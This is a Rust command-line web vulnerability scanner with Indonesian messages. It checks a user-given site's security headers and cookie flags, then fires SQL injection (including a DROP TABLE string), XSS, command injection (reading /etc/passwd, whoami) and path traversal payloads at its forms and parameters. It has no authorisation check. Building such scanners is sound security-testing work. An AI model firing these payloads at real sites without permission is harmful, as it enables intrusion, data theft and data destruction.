use reqwest::{self, Client};
use tokio;
use std::collections::HashMap;
use std::time::Duration;
use regex::Regex;
use url::Url;

#[tokio::main]
async fn main() {
    println!("=== SCANNER VULNERABILITY WEB ===");
    println!("Lebokne URL COK (contoh: https://example.com):");
    let mut url = String::new();
    std::io::stdin().read_line(&mut url).expect("Gagal membaca input");
    let url = url.trim();

    let url = if !url.starts_with("http://") && !url.starts_with("https://") {
        println!("URL harus dimulai dengan http:// atau https://");
        println!("Menambahkan https:// secara otomatis...");
        let fixed_url = format!("https://{}", url);
        println!("URL yang digunakan: {}", fixed_url);
        fixed_url
    } else {
        url.to_string()
    };
    
    match scan_vulnerabilities(&url).await {
        Ok(_) => println!("\n✅ Scanning selesai. Periksa hasil di atas untuk detail kerentanan."),
        Err(e) => eprintln!("❌ Error: {}", e),
    }
}

async fn scan_vulnerabilities(url: &str) -> Result<(), Box<dyn std::error::Error>> {
    println!("\n🔍 Memulai pemindaian kerentanan untuk: {}", url);
    
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::limited(5))
        .build()?;

    println!("\n[1/8] Mengecek aksesibilitas URL...");
    let response = match client.get(url).send().await {
        Ok(resp) => resp,
        Err(e) => {
            eprintln!("❌ Gagal mengakses URL: {}", e);
            return Err(Box::new(e));
        }
    };

    if !response.status().is_success() {
        eprintln!("⚠️ URL dapat diakses tetapi mengembalikan status: {}", response.status());
    } else {
        println!("✅ URL dapat diakses dengan status: {}", response.status());
    }

    let parsed_url = Url::parse(url)?;
    let domain = parsed_url.host_str().unwrap_or("unknown");
    println!("📌 Domain: {}", domain);

    println!("\n[2/8] Memeriksa header HTTP...");
    let headers = response.headers().clone();
    check_http_headers(&headers);

    println!("\n[3/8] Memeriksa konfigurasi dasar keamanan...");
    check_basic_security(url);

    println!("\n[4/8] Mencari form dan input field...");
    let forms = crawl_forms(url, &client).await?;
    println!("🔍 Menemukan {} form untuk pengujian", forms.len());

    println!("\n[5/8] Menguji kerentanan SQL Injection...");
    test_sql_injection(url, &client, &forms).await?;

    println!("\n[6/8] Menguji kerentanan Cross-Site Scripting (XSS)...");
    test_xss(url, &client, &forms).await?;

    println!("\n[7/8] Menguji kerentanan Command Injection...");
    test_command_injection(url, &client, &forms).await?;

    println!("\n[8/8] Memeriksa kerentanan Directory Traversal...");
    test_directory_traversal(url, &client).await?;
    
    Ok(())
}

fn check_http_headers(headers: &reqwest::header::HeaderMap) {
    let security_headers = [
        ("Strict-Transport-Security", "Mencegah downgrade HTTPS ke HTTP"),
        ("Content-Security-Policy", "Mencegah XSS dan injeksi data"),
        ("X-Content-Type-Options", "Mencegah MIME-sniffing"),
        ("X-Frame-Options", "Mencegah clickjacking"),
        ("X-XSS-Protection", "Filter XSS pada browser lama"),
        ("Referrer-Policy", "Mengontrol informasi referrer"),
    ];
    
    let mut missing_count = 0;
    
    for (header, description) in security_headers {
        if !headers.contains_key(header) {
            println!("⚠️ Header {} hilang - {}", header, description);
            missing_count += 1;
        } else {
            println!("✅ Header {} ditemukan: {:?}", header, headers.get(header).unwrap());
        }
    }
    
    if let Some(cookie_header) = headers.get("set-cookie") {
        let cookie_str = cookie_header.to_str().unwrap_or("");
        if !cookie_str.contains("HttpOnly") {
            println!("⚠️ Cookie tidak memiliki flag HttpOnly - Rentan terhadap pencurian cookie via JavaScript");
        }
        if !cookie_str.contains("Secure") {
            println!("⚠️ Cookie tidak memiliki flag Secure - Cookie dapat dikirim melalui HTTP");
        }
        if !cookie_str.contains("SameSite") {
            println!("⚠️ Cookie tidak memiliki atribut SameSite - Rentan terhadap CSRF");
        }
    }
    
    if missing_count > 4 {
        println!("❌ Konfigurasi header sangat buruk: {} dari 6 header keamanan hilang", missing_count);
    } else if missing_count > 2 {
        println!("⚠️ Konfigurasi header kurang baik: {} dari 6 header keamanan hilang", missing_count);
    } else if missing_count > 0 {
        println!("ℹ️ Konfigurasi header cukup baik, tetapi masih ada {} header keamanan yang hilang", missing_count);
    } else {
        println!("✅ Konfigurasi header sangat baik!");
    }
}

fn check_basic_security(url: &str) {
    if !url.starts_with("https://") {
        println!("❌ HTTPS tidak digunakan. Website rentan terhadap penyadapan dan MITM attack.");
    } else {
        println!("✅ HTTPS digunakan.");
    }
    
    if url.matches('.').count() > 1 {
        let parts: Vec<&str> = url.split("://").nth(1).unwrap_or("").split('/').next().unwrap_or("").split('.').collect();
        if parts.len() > 2 {
            println!("ℹ️ Subdomain terdeteksi: {}. Pertimbangkan untuk memeriksa subdomain lain.", parts[0]);
        }
    }
}

async fn crawl_forms(base_url: &str, client: &Client) -> Result<Vec<HashMap<String, String>>, Box<dyn std::error::Error>> {
    let response = client.get(base_url).send().await?;
    let body = response.text().await?;
    
    let mut forms = Vec::new();
    
    let form_regex = Regex::new(r"<form[^>]*>(.+?)</form>")?;
    let action_regex = Regex::new(r#"action=["']([^"']+)["']"#)?;
    let method_regex = Regex::new(r#"method=["']([^"']+)["']"#)?;
    let input_regex = Regex::new(r#"<input[^>]*name=["']([^"']+)["'][^>]*>"#)?;
    
    for form_cap in form_regex.captures_iter(&body) {
        let form_html = &form_cap[0];
        let mut form_info = HashMap::new();
        
        if let Some(action_cap) = action_regex.captures(form_html) {
            let action = &action_cap[1];
            form_info.insert("action".to_string(), action.to_string());
        } else {
            form_info.insert("action".to_string(), base_url.to_string());
        }
        
        if let Some(method_cap) = method_regex.captures(form_html) {
            let method = &method_cap[1];
            form_info.insert("method".to_string(), method.to_string().to_lowercase());
        } else {
            form_info.insert("method".to_string(), "get".to_string());
        }
        
        let mut input_fields = Vec::new();
        for input_cap in input_regex.captures_iter(form_html) {
            input_fields.push(input_cap[1].to_string());
        }
        
        form_info.insert("inputs".to_string(), input_fields.join(","));
        forms.push(form_info);
    }
    
    if forms.is_empty() {
        let mut dummy_form = HashMap::new();
        dummy_form.insert("action".to_string(), base_url.to_string());
        dummy_form.insert("method".to_string(), "get".to_string());
        dummy_form.insert("inputs".to_string(), "id,search,q,query,page,file,path".to_string());
        forms.push(dummy_form);
    }
    
    Ok(forms)
}

async fn test_sql_injection(url: &str, client: &Client, forms: &[HashMap<String, String>]) -> Result<(), Box<dyn std::error::Error>> {
    let sql_payloads = vec![
        "' OR '1'='1", 
        "' OR 1=1 --", 
        "' UNION SELECT NULL, NULL --", 
        "1' OR '1'='1", 
        "admin' --", 
        "1; DROP TABLE users; --",
        "' OR 1=1 LIMIT 1; --",
        "')) OR 1=1 --",
        "') OR ('a'='a",
    ];
    
    let error_patterns = vec![
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", 
        "SQLite3", "syntax error", "unclosed quotation mark", "quoted string"
    ];
    
    let mut found_vulnerabilities = false;
    
    for form in forms {
        let action = form.get("action").unwrap_or(&url.to_string()).to_string();
        let method = form.get("method").unwrap_or(&"get".to_string()).to_string();
        let inputs_str = form.get("inputs").unwrap_or(&"".to_string()).to_string();
        let inputs: Vec<&str> = inputs_str.split(',').collect();
        
        for input_field in &inputs {
            if input_field.is_empty() { continue; }
            
            for payload in &sql_payloads {
                let mut params = HashMap::new();
                params.insert((*input_field).to_string(), payload.to_string());
                
                let response = if method == "post" {
                    client.post(&action).form(&params).send().await?
                } else {
                    client.get(&action).query(&params).send().await?
                };
                
                let body = response.text().await?;
                
                for pattern in &error_patterns {
                    if body.contains(pattern) {
                        println!("❌ Kerentanan SQL Injection ditemukan pada field '{}' dengan payload: {}", input_field, payload);
                        println!("   Error pattern terdeteksi: {}", pattern);
                        found_vulnerabilities = true;
                        break;
                    }
                }
                
                if body.contains("welcome") || body.contains("admin") || body.contains("dashboard") {
                    println!("⚠️ Kemungkinan SQL Injection (login bypass) pada field '{}' dengan payload: {}", input_field, payload);
                    found_vulnerabilities = true;
                }
            }
        }
    }
    
    if !found_vulnerabilities {
        println!("✅ Tidak ditemukan kerentanan SQL Injection yang jelas");
    }
    
    Ok(())
}

async fn test_xss(url: &str, client: &Client, forms: &[HashMap<String, String>]) -> Result<(), Box<dyn std::error::Error>> {
    let xss_payloads = vec![
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "\"><script>alert(1)</script>",
        "';alert(1);//",
        "<scr<script>ipt>alert(1)</script>",
        "<a href=\"javascript:alert(1)\">click me</a>",
        "<img src=\"1\" onerror=\"alert(1)\" />",
    ];
    
    let mut found_vulnerabilities = false;
    
    for form in forms {
        let action = form.get("action").unwrap_or(&url.to_string()).to_string();
        let method = form.get("method").unwrap_or(&"get".to_string()).to_string();
        let inputs_str = form.get("inputs").unwrap_or(&"".to_string()).to_string();
        let inputs: Vec<&str> = inputs_str.split(',').collect();
        
        for input_field in &inputs {
            if input_field.is_empty() { continue; }
            
            for payload in &xss_payloads {
                let mut params = HashMap::new();
                params.insert((*input_field).to_string(), payload.to_string());
                
                let response = if method == "post" {
                    client.post(&action).form(&params).send().await?
                } else {
                    client.get(&action).query(&params).send().await?
                };
                
                let body = response.text().await?;
                
                if body.contains(payload) {
                    println!("❌ Kerentanan XSS ditemukan pada field '{}' dengan payload: {}", input_field, payload);
                    found_vulnerabilities = true;
                    break;
                }
                
                if (payload.contains("alert") && body.contains("alert(1)")) || 
                   (payload.contains("onerror") && body.contains("onerror")) {
                    println!("⚠️ Kemungkinan XSS pada field '{}' dengan payload: {}", input_field, payload);
                    found_vulnerabilities = true;
                }
            }
        }
    }
    
    if !found_vulnerabilities {
        println!("✅ Tidak ditemukan kerentanan XSS yang jelas");
    }
    
    Ok(())
}

async fn test_command_injection(url: &str, client: &Client, forms: &[HashMap<String, String>]) -> Result<(), Box<dyn std::error::Error>> {
    let cmd_payloads = vec![
        "; ls -la", 
        "& whoami", 
        "| cat /etc/passwd", 
        "`id`",
        "$(id)",
        "& ping -c 3 127.0.0.1",
        "; sleep 5",
        "| dir",
        "& type C:\\Windows\\win.ini",
        "; Get-Process",
    ];
    
    let cmd_patterns = vec![
        "root:", "bin:", "daemon:", "Directory of", "Volume Serial Number",
        "uid=", "gid=", "groups=", "Microsoft Windows", "for 16-bit app support",
        "Handle", "NPM(K)", "PM(K)", "WS(K)", "VM(M)", "CPU(s)",
    ];
    
    let mut found_vulnerabilities = false;
    
    for form in forms {
        let action = form.get("action").unwrap_or(&url.to_string()).to_string();
        let method = form.get("method").unwrap_or(&"get".to_string()).to_string();
        let inputs_str = form.get("inputs").unwrap_or(&"".to_string()).to_string();
        let inputs: Vec<&str> = inputs_str.split(',').collect();
        
        for input_field in &inputs {
            if input_field.is_empty() { continue; }
            
            let suspicious_params = ["cmd", "command", "exec", "run", "ping", "query", "system", "code", "shell"];
            if !suspicious_params.iter().any(|&s| input_field.contains(s)) && inputs.len() > 3 {
                continue;
            }
            
            for payload in &cmd_payloads {
                let mut params = HashMap::new();
                params.insert((*input_field).to_string(), payload.to_string());
                
                let start = std::time::Instant::now();
                let response = if method == "post" {
                    client.post(&action).form(&params).send().await?
                } else {
                    client.get(&action).query(&params).send().await?
                };
                let duration = start.elapsed();
                
                let body = response.text().await?;
                
                for pattern in &cmd_patterns {
                    if body.contains(pattern) {
                        println!("❌ Kerentanan Command Injection ditemukan pada field '{}' dengan payload: {}", input_field, payload);
                        println!("   Pattern terdeteksi: {}", pattern);
                        found_vulnerabilities = true;
                        break;
                    }
                }
                
                if payload.contains("sleep") && duration.as_secs() >= 4 {
                    println!("❌ Kemungkinan Command Injection (time-based) pada field '{}' dengan payload: {}", 
                             input_field, payload);
                    println!("   Waktu respons: {:?}", duration);
                    found_vulnerabilities = true;
                }
            }
        }
    }
    
    if !found_vulnerabilities {
        println!("✅ Tidak ditemukan kerentanan Command Injection yang jelas");
    }
    
    Ok(())
}

async fn test_directory_traversal(url: &str, client: &Client) -> Result<(), Box<dyn std::error::Error>> {
    let traversal_payloads = vec![
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "file:///etc/passwd",
    ];
    
    let traversal_patterns = vec![
        "root:", "bin:", "daemon:",
        "; for 16-bit app support", "[fonts]", "[extensions]",
        "boot loader", "operating systems",
        "[boot loader]", "default=",
    ];
    
    let parsed_url = Url::parse(url)?;
    let mut path_parts: Vec<&str> = parsed_url.path().split('/').collect();
    if !path_parts.is_empty() {
        path_parts.pop();
    }
    
    let mut found_vulnerabilities = false;
    
    let file_params = ["file", "path", "document", "load", "read", "include", "require", "doc", "pdf", "template", "page"];
    
    for param in &file_params {
        for payload in &traversal_payloads {
            let test_url = format!("{}?{}={}", url, param, payload);
            let response = client.get(&test_url).send().await?;
            
            if response.status().is_success() {
                let body = response.text().await?;
                
                for pattern in &traversal_patterns {
                    if body.contains(pattern) {
                        println!("❌ Kerentanan Directory Traversal ditemukan dengan parameter '{}' dan payload: {}", param, payload);
                        println!("   Pattern terdeteksi: {}", pattern);
                        found_vulnerabilities = true;
                        break;
                    }
                }
            }
        }
    }
    
    if !path_parts.is_empty() {
        let base_path = path_parts.join("/");
        for payload in &traversal_payloads {
            let test_url = format!("{}/{}/{}", parsed_url.origin().ascii_serialization(), base_path, payload);
            let response = client.get(&test_url).send().await?;
            
            if response.status().is_success() {
                let body = response.text().await?;
                
                for pattern in &traversal_patterns {
                    if body.contains(pattern) {
                        println!("❌ Kerentanan Path Traversal ditemukan di URL path dengan payload: {}", payload);
                        println!("   Pattern terdeteksi: {}", pattern);
                        found_vulnerabilities = true;
                        break;
                    }
                }
            }
        }
    }
    
    if !found_vulnerabilities {
        println!("✅ Tidak ditemukan kerentanan Directory Traversal yang jelas");
    }
    
    Ok(())
}
